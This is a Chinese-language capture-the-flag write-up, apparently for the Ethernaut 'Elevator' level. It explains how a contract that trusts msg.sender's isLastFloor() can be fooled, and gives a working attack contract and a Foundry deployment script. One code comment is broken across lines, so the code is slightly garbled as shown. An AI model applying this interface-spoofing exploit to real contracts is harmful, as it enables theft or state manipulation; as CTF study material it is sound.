# Elevator 接口

## 源代码

目标:达到顶楼,就是让这个top==ture呗

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## 目标合约分析

有一个接口`Building`

在目标合约里只有一个函数`goTo()`,可以看到这句

```solidity
Building building = Building(msg.sender);//把msg.sender变成接口类型
```

意思是在目标合约内部,他将在msg.sender地址上执行接口

这里这几行

```solidity
if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
```

首先if判断条件,要调用一次`isLastFloor(_floor)`,这个时候要求返回false,把当前楼层设置为\_floor

然后下一句还要调用一次`isLastFloor(_floor)`,把他的返回值赋给top,只要这个top==ture了,就通关

## 思路

写一个攻击合约,两次调用`isLastFloor(_floor)`,让它**第一次返回flase,第二次返回ture**,这个第二次返回的ture就是top的赋值,从而通关

## 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Attack is Building {
    Elevator private iroha;
    uint private count;//一开始默认=0

    constructor(address addr) {
        iroha = Elevator(addr);
    }

    function illit() external {
        iroha.goTo(7);//这个楼层不重要,随便填个就好
        require(iroha.top() == true, "no!");
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        return count > 1;//如果count>1,就返回true
      ,反之返回false
    }
}
```

第一次调用:count=1,返回false

第二次调用:count=2,满足>1的条件,返回ture,即top==ture

## 脚本

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x752451CFD074a40aC8B96c8b0e0810392fDB1Cc4);
        attack.illit();
        vm.stopBroadcast();
    }
}
```

!\[]\(C:\Users\HUAWEI\Pictures\Screenshots\屏幕截图 2025-05-24 162431.png)

把关卡地址整上去了呵呵^ \_ ^我这家伙


> 更新: 2025-07-11 19:13:04  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/blk0bqobrr6gi2ow>